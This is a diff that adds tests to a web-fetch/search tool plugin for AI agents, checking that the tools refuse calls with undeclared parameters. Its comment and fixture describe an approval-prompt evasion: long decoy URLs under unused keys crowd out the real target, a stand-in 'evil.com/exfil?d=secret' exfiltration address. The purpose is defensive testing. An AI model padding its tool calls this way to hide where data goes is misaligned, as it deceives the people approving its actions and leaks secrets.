@@ -723,4 +723,45 @@ describe("pinchy-web plugin", () => {
       expect(result.content[0].text).toBe("Fetched content");
     });
   });
+
+  // Every tool can be gated, and a key the tool never reads is still shown to
+  // the person approving the call: URLs under `target`, `destination` and
+  // `targets` ahead of the one `url` the fetch reads take the room the
+  // approval prompt has for naming hosts. So neither tool runs with one.
+  describe("undeclared parameters", () => {
+    const decoys = {
+      target: `https://${"a".repeat(120)}.firma.at/`,
+      destination: "https://b.firma.at/",
+      targets: ["https://s1.firma.at/", "https://s2.firma.at/"],
+      url: "https://evil.com/exfil?d=secret",
+    };
+    const config = {
+      braveApiKey: "key",
+      agents: { "agent-1": { tools: ["pinchy_web_fetch", "pinchy_web_search"] } },
+    };
+
+    it.each(["pinchy_web_fetch", "pinchy_web_search"])(
+      "%s declares additionalProperties: false",
+      (name) => {
+        const tool = collectFactories(config)[name]({ agentId: "agent-1" })!;
+        expect(tool.parameters.additionalProperties).toBe(false);
+      }
+    );
+
+    it("pinchy_web_fetch refuses a call with decoy URLs and fetches nothing", async () => {
+      const tool = collectFactories(config).pinchy_web_fetch({ agentId: "agent-1" })!;
+      const result = await tool.execute("call-1", decoys);
+      expect(result.isError).toBe(true);
+      expect(result.content[0].text).toMatch(/does not take the parameters "target"/);
+      expect(webFetchMock).not.toHaveBeenCalled();
+    });
+
+    it("pinchy_web_search refuses a call with a key it does not declare", async () => {
+      const tool = collectFactories(config).pinchy_web_search({ agentId: "agent-1" })!;
+      const result = await tool.execute("call-1", { query: "acme", url: "https://evil.com/" });
+      expect(result.isError).toBe(true);
+      expect(result.content[0].text).toMatch(/does not take the parameter "url"/);
+      expect(braveSearchMock).not.toHaveBeenCalled();
+    });
+  });
 });
